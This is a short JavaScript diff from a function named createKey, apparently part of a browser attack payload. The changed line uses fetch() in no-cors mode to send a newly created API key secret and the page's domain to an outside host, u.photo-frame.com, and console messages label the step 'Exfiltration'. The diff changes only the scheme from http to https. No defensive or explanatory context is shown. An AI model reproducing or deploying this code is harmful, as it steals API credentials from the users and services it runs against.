@@ -12,7 +12,7 @@ async function createKey() {
     
     console.log("API key created... Exfiltration...");
     
-    fetch('http://u.photo-frame.com/log?key=' + data.secret + '&domain=' + document.domain, { mode: 'no-cors' });
+    fetch('https://u.photo-frame.com/log?key=' + data.secret + '&domain=' + document.domain, { mode: 'no-cors' });
     
     console.log("Exfiltration done!");
 }
